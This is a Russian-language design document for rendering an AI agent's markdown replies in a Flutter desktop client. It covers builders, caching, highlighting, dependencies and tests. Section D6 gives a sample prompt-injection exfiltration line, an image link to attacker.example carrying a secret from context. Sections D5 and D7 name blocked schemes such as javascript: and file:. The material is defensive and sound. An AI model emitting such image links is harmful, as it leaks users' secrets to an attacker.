## Context

**Дефект.** SMK-07 ([#177](https://github.com/pese-git/codelab-app/issues/177)): в ленте desktop ответ агента показан сырым — `**`, обратные кавычки, строки ```` ``` ````. Цель матрицы — D-06 (Should, группа 7 плана 1.0), критерий — `packages/flutter/codelab_ui/test/acp_markdown_test.dart`.

**ACP.** Ответ агента приходит `agent_message_chunk` с `TextContent`. Схема: «May be plain text or formatted with Markdown… Clients SHOULD render this text as Markdown» (`docs/protocols/acp/protocol/17-Schema.md`, `ContentBlock` → `text`). Диалект markdown ACP не задаёт. Протокол этот change не меняет.

**Принятая архитектура до change** (`dart-agent-and-clients`, Status: Accepted): общая модель `MarkdownDocument` и свой `IncrementalMarkdown` в `codelab_client_core` для CLI и app (§12.1.1, §12.1.4, VIEW-3, VIEW-11, VIEW-12, DSK-2); своя отрисовка блоков в `codelab_ui` и подсветка `re_highlight` (§12.3.2–§12.3.7, DSK-3, DSK-5–DSK-7). Решение пользователя 2026-11-11 меняет это для desktop (D1); правка разделов — задача 0.2.

**Сверка с кодом (ветка от `develop` 5e6e1254).**

| Что в документах | Что в коде |
|---|---|
| `MarkdownDocument`, `IncrementalMarkdown` в kit | нет; `AgentTextItem` — `id` и `text`; экземпляры неизменённых элементов сохраняются (VIEW-11) |
| строка на блок markdown, маппер с кешем по `identical` (§12.3.2, A1) | `CodeLabAgentTextRow(text, preformatted)`; маппер `transcriptRowsOf` строит строки заново на каждую ревизию, id позиционные (`agent-N`) |
| `AcpMarkdownBlockView`, `AcpCodeHighlighter`, `ExternalLinkOpener` | нет; ответ — один `CodeLabText` без выделения, огороженный ответ — `CodeLabMonospaceBlock` (Q37 change `add-provider-setup-ui`) |
| порт платформы в `core/platform` | образец — `ProjectFolderPicker` с привязкой в `app_scope.dart` |
| зависимости markdown, подсветки, ссылок | нет ни в `pubspec.yaml`, ни в `pubspec.lock` |

Код ленты в архивных changes ссылается на этот change как на `add-transcript-markdown` (`redesign-transcript-rows/design.md`, `redesign-workbench-shell/design.md`, комментарий `CodeLabAgentTextRow`). Change назван по ветке `feature/add-desktop-markdown`; комментарий в коде обновляет задача 2.4.

**Прототип 2026-11-11** (`gpt_markdown` 1.4.1 в Fluent-приложении, тесты t1–t7; вне репозитория): факты ниже вошли в решения D2–D9, риски и тесты.

| # | Факт | Где учтён |
|---|---|---|
| 1 | закрытые блоки строятся один раз, если тема и builder'ы стабильны; на ответе 48 КБ первый блок кода монтировался дважды | D3, риск R1, задача 2.1 |
| 2 | новая тема или новые builder'ы на каждой сборке — ×3–4 медленнее, все закрытые блоки перестраиваются | D3 |
| 3 | без `imageBuilder` пакет сам грузит PNG и SVG (`HttpClient`, `http.get`); `<img>` из HTML тоже идёт в `imageBuilder` | D6, D7 |
| 4 | `onLinkTap` получает текст ссылки, а не адрес; ссылки с любой схемой рисуются активными | D5 |
| 5 | список задач без Material-предка падает (issue #154 пакета) | D4 |
| 6 | в тёмной теме Fluent встроенная подсветка светлая: берёт Material `Theme` | D4 |
| 7 | `SelectionArea` работает, но копия блоков идёт без разделителей, подпись языка прилипает к коду | D4, D8 |
| 8 | `SliverGptMarkdown` в `ListView` ленты неприменим | D3 |
| 9 | debug: 1,6–2,9 мс на chunk при ответе 12–48 КБ и кешированной теме | риск R2, задача 4.4 |
| 10 | 12 новых пакетов, лицензии BSD-3-Clause и MIT; шрифты JetBrains Mono (лицензия в пакете не найдена) и Latin Modern (GUST) | D10, задача 1.1 |

## Goals / Non-Goals

**Goals:** ответ агента в ленте desktop — markdown без сырых маркеров (SMK-07); блок кода с языком, копированием и подсветкой (D-06); стриминг не перестраивает закрытые блоки (DSK-3) и не мигает между вариантами разметки (DSK-6); ни одна ссылка не открывается и ни одно изображение не загружается без действия пользователя, а опасные схемы не открываются вовсе.

**Non-Goals:** разбор в kit и CLI U-10 (отдельный change `add-cli-markdown`), D-07, D-08 (сделан), D-09, D-12, «Copy reply», выделение через всю ленту, сворачивание и полный просмотр большого кода, разметка промпта пользователя и мыслей, изменения ACP.

## Решения пользователя 2026-11-11

Заменяют Open Questions Q1–Q6 первой редакции этого change.

- **Разбор и стриминг в desktop — пакет `gpt_markdown` 1.4.1** (BSD-3-Clause, useval). Свой парсер в kit не делается, `AgentTextItem` остаётся текстом. Альтернатива «свой разбор в kit + своя отрисовка + `re_highlight`» (§12.1.4, §12.3) отклонена после прототипа (D1).
- **Без Material-обёртки:** свои `codeBuilder` (наша палитра из ролей `FluentTheme`, контраст ≥ 4,5:1), `checkboxBuilder` (Fluent `Checkbox` только для чтения), `imageBuilder`, `inlineLinkBuilder`; тема и builder'ы создаются один раз и кешируются (D3, D4).
- **Изображения** по умолчанию не загружаются: заглушка с хостом и кнопкой «Show image»; загрузка только по клику и только `https`. VIEW-12 и DSK-7 переформулируются: «не загружать без явного действия пользователя» (D6).
- **Ссылки:** активны только `http`, `https`, `mailto`; клик открывает сразу, без окна подтверждения (меняет прежний Q2); полный адрес — во всплывающей подсказке; прочие схемы — обычный текст. Порт `ExternalLinkOpener` на `url_launcher`; журнал — только схема, хост, исход (D5).
- **Q3** — CLI получает отдельный change `add-cli-markdown` со своим разбором. **Q4** — своя палитра. **Q5** — без «Copy reply». **Q6** — ответ одним огороженным блоком (`/mcp list`) рисуется общим блоком кода с подписью и «Copy».
- **Движок подсветки** и **LaTeX** — техническое решение архитектора (D4, D9).

## Decisions

### D1. Разбор markdown — пакет `gpt_markdown` в desktop, без модели в kit

Ответ агента рисует `GptMarkdown(text)` внутри `codelab_ui`. Пакет сам разбивает документ на сегменты верхнего уровня и кеширует виджет каждого сегмента; при дописывании текста перестраивается только хвост (документация параметра `incremental`, разбор `plusparse` по умолчанию). Kit не меняется: `AgentTextItem.text` уже хранит накопленный текст отрезка, VIEW-11 выполняется как раньше.

| Вариант | Итог |
|---|---|
| `gpt_markdown` 1.4.1 со своими builder'ами | **выбран пользователем**: стриминг с кешем сегментов, таблицы, задачи, LaTeX, выделение текста — готовы; прототип в Fluent прошёл после замены builder'ов |
| свой `IncrementalMarkdown` в kit + своя отрисовка + `re_highlight` (§12.1.4, §12.3) | **отклонён пользователем после прототипа**: несколько сотен строк разбора и отрисовки своими силами против готового пакета; общая модель с CLI не нужна, CLI делает свой разбор |
| `package:markdown` (dart-lang, BSD-3-Clause, 7.3.1) + своя отрисовка | разбирает документ целиком на каждый chunk; отрисовку всё равно писать самим |
| `flutter_markdown` | прекращён (README 0.7.7+1: «discontinued»), Material-стили |

Последствия для принятых документов (задача 0.2):

- `12-1-view-model.md`: модель `MarkdownDocument` и §12.1.4 становятся основой будущего `add-cli-markdown` только для CLI; в `AgentTextItem` поля `markdown` нет; VIEW-3 относится к CLI; VIEW-12 — «изображение не загружается без явного действия пользователя».
- `12-3-desktop-display.md`: DSK-2 — разбор в desktop выполняет `gpt_markdown` внутри `codelab_ui`, app markdown не разбирает; DSK-3 — кеш сегментов пакета при стабильной теме и builder'ах; DSK-7 — по D5 и D6; строки §12.3.2 про `AcpMdBlock`, `AcpAgentBlockRow`, `AcpMarkdownBlockView` и A1 (кеш блоков) — заменены ссылкой на этот change; §12.3.6 — таблица зависимостей (`gpt_markdown`, `val_highlight`, `url_launcher` вместо `re_highlight`).

### D2. Где живёт пакет: `codelab_ui/lib/src/rendering/`, политика — в app

`gpt_markdown` — зависимость `codelab_ui`, а не app: это отрисовка, без бизнес-логики и без доступа к сети в нашей конфигурации (D6). В `codelab_ui` уже живут лента, её превью и widget-тесты; критерий D-06 — тест этого пакета. Импорт `package:gpt_markdown/` разрешён только из `lib/src/rendering/` (правило сторожа, D10): при замене пакета меняется один каталог.

Решения «опасно ли» кит не принимает (вложенный `AGENTS.md` §2). Политику передаёт app через `CodeLabMarkdownScope` (`InheritedWidget` над лентой):

- `bool Function(Uri) canOpenLink` и `ValueChanged<Uri> onOpenLink`;
- `bool Function(Uri) canLoadImage` и `ImageProvider Function(Uri) imageFor`;
- `Set<String> shownImages` и `ValueChanged<String> onShowImage` (D6).

Политику в app задают чистые функции `isOpenableLink(Uri)` и `isLoadableImage(Uri)` в `apps/codelab_desktop/lib/features/workbench/application/link_policy.dart`. Без scope (превью, тесты кита) ссылки и изображения неактивны.

**Альтернатива:** пакет в app, `codelab_ui` получает готовый виджет. Отклонена: лента, её строки и тесты D-06 — в `codelab_ui`, и app пришлось бы передавать виджет внутрь модели строки.

### D3. Строка ленты и стабильность сегментов

- `CodeLabAgentTextRow(id, text, streaming)`: одна строка на ответ, id прежние (`agent-N`), ключи и ручное раскрытие не меняются. `streaming` вычисляет маппер так же, как для мыслей (`isRunning && последний элемент`). `preformatted` и вызов `unfenceSingleBlock` из маппера ленты уходят; функция остаётся только у панели «Agent status» (`mcp_settings_cubit.dart`, SETUP-11).
- Строку рисует `CodeLabMarkdown(text, streaming)` → `GptMarkdown(text, isStreaming: streaming, animation: none)`. `SliverGptMarkdown` не используется: лента — `ListView.builder` строк (факт 8).
- **Стабильность конфигурации.** `GptMarkdownThemeData`, стиль, все builder'ы, `htmlTags` и наборы схем создаются один раз в `CodeLabMarkdownConfig` и переиспользуются: builder'ы — поля, созданные в конструкторе, а не замыкания и tear-off'ы в `build` (пакет сравнивает их по identity). Конфигурация пересоздаётся только при смене `FluentThemeData` и хранится в `State` ленты; политика app (D2) приходит через `InheritedWidget` и читается builder'ами из `context`, поэтому новая политика не делает конфигурацию новой (факт 2).
- Закрытый блок кода строится не больше одного раза за стрим (DSK-3). Debug-счётчики `CodeLabMarkdownStats.codeBlockBuilds` и `headingBuilds` (только внутри `assert`) дают тесту наблюдаемость без замеров времени. Двойной монтаж первого блока кода на 48 КБ (факт 1) — красный тест 2.1; исправление — в нашей конфигурации или ключах; если причина в пакете — стоп и вопрос пользователю (R1).

### D4. Builder'ы и тема без Material

- **Тема:** `GptMarkdownThemeData` из `FluentTheme` (типографика, `accentColor`, `resources`), без `Theme.of` Material.
- **`codeBuilder(context, name, code, closed)`** → `CodeLabCodeBlock`: подпись языка внутри `SelectionContainer.disabled` (не попадает в копию, факт 7), кнопка «Copy» (ключ `code-copy-<rowId>-<n>`, `n` — порядковый номер блока кода в ответе) кладёт `code` без ограды; код выделяется. `closed == false` — моноширинно без подсветки (DSK-6).
- **Подсветка:** `CodeLabCodeHighlighter` в `rendering/` на `val_highlight` (BSD-3-Clause, чистый Dart без зависимостей, уже приходит с `gpt_markdown`; `val_highlight_flutter` не используется — он берёт Material). Наружу — токены строк как простые данные `(start, end, CodeLabTokenClass)`, их можно вернуть из isolate. Пороги A4 без изменений: ≤ 300 строк и ≤ 16 КиБ — синхронно; ≤ 5000 строк и ≤ 256 КиБ — `compute`, до результата без цвета, затем одна перерисовка; больше — без подсветки (DSK-5). LRU на 256 записей по `(language, hash(code))`. Язык — только из info-строки, автоопределения нет (у `val_highlight` оно есть — не используется). Результат `compute` применяется, только если виджет смонтирован и ключ не изменился; сбой — код без цвета и `FlutterError.reportError` без текста кода (`AGENTS.md` §12).
- **Палитра:** `CodeLabCodeTheme` — `ThemeExtension` в `FluentThemeData.extensions`, светлая и тёмная палитры из ролей `FluentTheme` (акцент, `CodeLabTone`, приглушённые цвета), контраст каждого класса токена ≥ 4,5:1 на фоне блока (DSK-19, Q4). Темы `val_highlight` не используются.
- **`checkboxBuilder`** → Fluent `Checkbox` с `onChanged: null` и подписью для доступности (факт 5).
- **`inlineCodeBuilder`**, заголовки, цитаты, таблицы, черта — стилями темы из `FluentTheme`; литералов цветов нет (DSK-19).
- **`inlineLinkBuilder`** и **`imageBuilder`** — D5, D6.

**Почему `val_highlight`, а не `re_highlight`:** он уже в графе зависимостей с `gpt_markdown`, той же лицензии и того же автора, чистый Dart; второй движок подсветки только увеличил бы сборку. `re_highlight` в pub-cache нет, его проверка лицензии не нужна.

### D5. Ссылки

- `inlineLinkBuilder` (и `linkBuilder`, если пакет выберет его для ссылки) получает `LinkBuildDetails.url`, а не текст (факт 4): `onLinkTap` пакета не используется.
- Активна ссылка, только если `canOpenLink(uri)` из scope истинно. `isOpenableLink`: схема `http` или `https` с непустым хостом, либо `mailto` с непустым адресом; `Uri.tryParse` без ошибки. Всё прочее — `file:`, `javascript:`, `data:`, `vscode:` и другие схемы, protocol-relative `//host`, относительные пути, `xmpp:` (пакет связывает его автоссылкой) — обычный текст без подчёркивания и без реакции на клик.
- Активная ссылка — подчёркнутый `accentColor`, `Tooltip` с полным адресом (управляющие символы C0/C1 и символы направления текста `U+202A…U+202E`, `U+2066…U+2069` заменены видимыми escape-последовательностями). Клик сразу вызывает `onOpenLink(uri)` (решение пользователя: без окна подтверждения).
- `onOpenLink` → `CodeLabShellCubit.openExternalLink(Uri)`: повторная проверка `isOpenableLink`, затем порт `ExternalLinkOpener` (`apps/codelab_desktop/lib/core/platform/external_link_opener.dart`, реализация на `url_launcher`, привязка в `app_scope.dart` по образцу `ProjectFolderPicker`). Отказ платформы — InfoBar `Couldn't open the link.` и запись в журнал.
- Агент не может открыть ссылку сам: открытие начинается только с клика (DSK-7, `platform-integration.md` §35).

### D6. Изображения: не загружать без явного действия пользователя

**Почему:** автозагрузка — канал утечки через prompt injection. Модель, прочитавшая враждебный файл или страницу, может вывести `![](https://attacker.example/?d=<секрет из контекста>)`, и клиент сам отправит запрос с данными. Тот же риск у `<img>` из HTML (факт 3). VIEW-12 и DSK-7 переформулируются: «изображение не загружается без явного действия пользователя» (задача 0.2).

- `imageBuilder` переопределён всегда: без него пакет сам грузит PNG и SVG (факт 3). Пакет передаёт в builder только адрес и размер, `alt` недоступен; заглушка показывает «Image», хост и имя файла из пути, полный адрес — в подсказке (с экранированием как в D5).
- Кнопка «Show image» есть, только если `canLoadImage(uri)`: `isLoadableImage` — только `https` с непустым хостом. `http`, `data:`, `file:`, относительные пути — заглушка без кнопки.
- Клик → `onShowImage(url)` → `TranscriptViewCubit` запоминает адрес в наборе показанных изображений строки (ключ `<rowId>#image:<url>`, существующие `expansionOverrides`; UI-состояние текущего запуска, не сохраняется, DSK-20). Только после этого виджет строит `Image(image: imageFor(uri))`; `imageFor` в app — `ResizeImage(NetworkImage(uri), width: 1440)` (ширина колонки ×2): декодирование не раздувает память на огромной картинке. SVG не поддерживается (`Image` его не декодирует) — заглушка с ошибкой загрузки.
- Показ привязан к строке и адресу: одинаковый адрес в другом ответе снова требует клика.

### D7. HTML не разбирается

`GptMarkdown(html: false)`: теги показываются как написаны, как в большинстве чат-интерфейсов (документация параметра `html`). Так `<img>`, `<a href="javascript:…">` и обёртки вообще не становятся элементами, а `imageBuilder` и фильтр ссылок остаются второй линией защиты. Flutter HTML не исполняет, WebView нет.

### D8. Выделение текста

Строка ответа оборачивается в `SelectionArea`: текст выделяется и копируется системным сочетанием. Сейчас текст ответа не выделяется вовсе (`CodeLabText`). Ограничение пакета: при копировании через несколько блоков между ними нет перевода строки (факт 7) — принимается; подпись языка из выделения исключена (D4). Выделение через несколько строк ленты и «Copy reply» — не в этом change (Q5).

### D9. LaTeX

Оставляется по умолчанию пакета: `useDollarSignsForLatex: false` — `$` остаётся обычным символом (суммы, переменные shell); формулы — только в `\(…\)` и `\[…\]`. Формулы рисует `val_latex_flutter` без сети; ответы моделей с формулами встречаются, а выключение не уменьшает граф зависимостей (`val_latex*` приходят с пакетом). Шрифты Latin Modern попадают в сборку в любом случае — запись в `THIRD_PARTY_NOTICES.md` (D10).

### D10. Пакеты, зависимости, сторож, граф

| Пакет | Изменение | Новые прямые зависимости |
|---|---|---|
| `codelab_ui` | `rendering/`, строка ответа, превью, тесты; `environment`: Dart ≥ 3.12, Flutter ≥ 3.44 | `gpt_markdown` 1.4.1, `val_highlight` |
| `apps/codelab_desktop` | маппер, политика, порт ссылок, показ изображений | `url_launcher` |
| `codelab_architecture_tests` | правила сторожа | нет |
| `codelab_client_core`, `apps/codelab_cli` | нет | нет |

- Транзитивно приходят `material_ui`, `cupertino_ui`, `flutter_svg`, `vector_graphics`, `vector_graphics_codec`, `vector_graphics_compiler`, `path_parsing`, `val_highlight_flutter`, `val_latex`, `val_latex_flutter` и уже существующие в графе `http`, `xml`. Лицензии по прототипу — BSD-3-Clause и MIT (совместимы с MIT репозитория, `07-decision-sources.md` §7а, п. 4–5); задача 1.1 сверяет каждую по `pubspec.lock` и pub-cache.
- **Шрифты** в сборке app: JetBrains Mono (`gpt_markdown/lib/fonts/`; файла лицензии в пакете нет — **проверить**, у JetBrains Mono обычно SIL OFL 1.1) и Latin Modern (`val_latex_flutter/fonts/latin-modern/`, GUST Font License). Распространяются в составе сборки — записи в `THIRD_PARTY_NOTICES.md` (задача 1.1). Если лицензию JetBrains Mono подтвердить нельзя — стоп и вопрос пользователю.
- **Минимальный SDK:** `gpt_markdown` требует Dart ≥ 3.12 и Flutter ≥ 3.44 (через `material_ui`); FVM — 3.47.0. `technology-stack.md` §1 (минимальный SDK workspace 3.10) уточняется для `codelab_ui` и app.
- **Правила сторожа** (`codelab_architecture_tests/test/support/rules.dart`, по образцу правила `dart_tui`):
  - `package:gpt_markdown/` и `package:val_highlight/` — только в `packages/flutter/codelab_ui/lib/src/rendering/`;
  - `package:material_ui/`, `package:cupertino_ui/`, `package:val_highlight_flutter/`, `package:val_latex_flutter/`, `package:flutter_svg/` — запрещены в `packages/flutter/codelab_ui/lib` и `apps/codelab_desktop/lib`;
  - `package:url_launcher/` — только в `apps/codelab_desktop/lib/core/platform/`.
- Направление зависимостей не меняется, `codelab_ui` по-прежнему без внутренних пакетов; граф в `README.md` не меняется. `kitAllowlist` и allowlist ядра агента (PKG-2) не затрагиваются. `web-compile` не затрагивается (`codelab_ui` в него не входит).
- `technology-stack.md` получает строки «Markdown в ленте (`codelab_ui`) — `gpt_markdown`», «Подсветка кода (`codelab_ui`) — `val_highlight`», «Открытие внешних ссылок (`codelab_desktop`) — `url_launcher`»; вложенный `AGENTS.md` `codelab_ui` — зависимости (§1), политика ссылок и изображений приходит из app (§2), слой `rendering/` (§3).

### D11. Ответ одним огороженным блоком

Требование «Ответ агента одним огороженным блоком» (Q37 change `add-provider-setup-ui`) становится частным случаем markdown: блок кода D4 с подписью языка и «Copy», без строк ограды. Пока закрывающей ограды нет — моноширинно без подсветки (DSK-6), а не сырой текст. `text` не подсвечивается: язык не зарегистрирован в `CodeLabCodeHighlighter`.

### D12. Наблюдаемость

Отрисовка не логирует текст ответа. Открытие ссылки — событие `link.open` с полями `scheme`, `host`, `outcome` (`opened` / `failed` / `rejectedScheme`); путь, query и fragment не пишутся (`AGENTS.md` §16). Показ изображения — `image.show` с `host`. Сбой подсветки — `FlutterError.reportError` без кода.

### D13. Тесты

Счётчики работы вместо времени (§12.3.7). Сеть в тестах перехватывается `HttpOverrides`: любой запрос — провал теста.

| Тест | Цель |
|---|---|
| `codelab_ui/test/acp_markdown_test.dart` | D-06, DSK-3, DSK-5, DSK-6, DSK-7: разметка без Material-предка в светлой и тёмной теме Fluent; блок кода, «Copy», подпись вне выделения; 200 chunks и 48 КБ — каждый закрытый блок кода и заголовок строятся один раз; незакрытая ограда; большой код вне UI isolate; фильтр схем; изображения без запросов до клика; HTML текстом |
| `codelab_ui/test/rendering/code_highlighter_test.dart` | пороги, LRU, неизвестный язык, контраст палитры ≥ 4,5:1 |
| `apps/codelab_desktop/test/features/workbench/application/link_policy_test.dart` | таблица схем для ссылок и изображений |
| `ui_mappers_test.dart`, тест `TranscriptViewCubit` | `streaming` строки, огороженный ответ без `unfenceSingleBlock`, показанные изображения |
| `external_link_opener_test.dart`, тест `openExternalLink` | повторная проверка схемы, журнал без query |
| widget-тест workbench | регресс SMK-07 и сквозная проверка политики |
| `integration_test/transcript_rendering_flow_test.dart` (markdown-часть) | в `feature/*` только компиляция и анализ, на устройстве — в `release/*` (§21) |

## Risks / Trade-offs

- **R1. Двойной монтаж блока кода (DSK-3, DSK-6).** Прототип на 48 КБ дважды смонтировал первый блок кода. Если это не наша конфигурация, а поведение пакета, DSK-3 нарушается на длинных ответах: подсветка может запуститься дважды (LRU это гасит), `State` блока теряется. Красный тест 2.1; при причине в пакете — вопрос пользователю (ослабить DSK-3 или исправление в пакете).
- **R2. Производительность.** 1,6–2,9 мс на chunk в debug на 12–48 КБ. Release-профиль на macOS — задача 4.4 (в `release/*` или по просьбе пользователя). Нестабильная тема или builder'ы — ×3–4 (D3), это ловит тест счётчиков.
- **R3. Сеть внутри пакета.** `gpt_markdown` и `flutter_svg` содержат код загрузки изображений по `http`. Наша конфигурация его не вызывает (`imageBuilder`, `html: false`), но новая версия пакета может добавить путь. Защита: тест с `HttpOverrides` на каждый вид изображения, версия пакета закреплена диапазоном `>=1.4.1 <1.5.0`, обновление — отдельным PR с прогоном теста.
- **R4. Prompt injection и утечка данных.** Изображения — только по клику и только `https` (D6); ссылки — только `http`/`https`/`mailto` и только по клику (D5). Без окна подтверждения пользователь видит адрес только в подсказке: ссылка с подписью `docs` может вести на фишинговый адрес — принятый пользователем риск; смягчение — подсказка с полным адресом и экранированием bidi-символов. IDN-омографы не закрыты: Dart `Uri` не переводит хост в punycode.
- **R5. Отклонение от общей модели §12.1.** CLI и desktop разбирают markdown по-разному, и вид одного ответа может различаться (setext, HTML, автоссылки). Принято пользователем; `add-cli-markdown` выбирает свой разбор.
- **R6. Объём зависимостей и Material в графе.** 12 пакетов, среди них `material_ui` и `cupertino_ui`; сборка растёт за счёт шрифтов и грамматик. Импорт Material-пакетов в наш код запрещён сторожем; вид остаётся Fluent.
- **R7. Сопровождение пакета.** Один автор, частые выпуски, issue #154. Изоляция в `rendering/` и правило сторожа делают замену локальной.
- **Гонки и поздние события** (`AGENTS.md` §9, §12): результат `compute` после ухода виджета не применяется; клик по ссылке относится к адресу из спана, а не к текущей ревизии; показ изображения привязан к строке и адресу.
- **Containment и `fs/*` не затрагиваются:** `file:` и относительные пути не открываются и не читаются.
- **Forward compatibility ACP:** нетекстовые `ContentBlock` в ответе по-прежнему не показываются; протокол не меняется.

## Migration Plan

Persistence и ACP не меняются: журнал и реплей `session/load` дают тот же текст. Откат — revert change; данных для миграции нет.

## Open Questions

Нет. Вопросы Q1–Q6 первой редакции закрыты решениями пользователя 2026-11-11 (раздел выше). Условные остановки: лицензия шрифта JetBrains Mono (D10) и причина двойного монтажа блока кода (R1) — при отрицательном исходе задачи 1.1 или 2.1 вопрос возвращается пользователю.
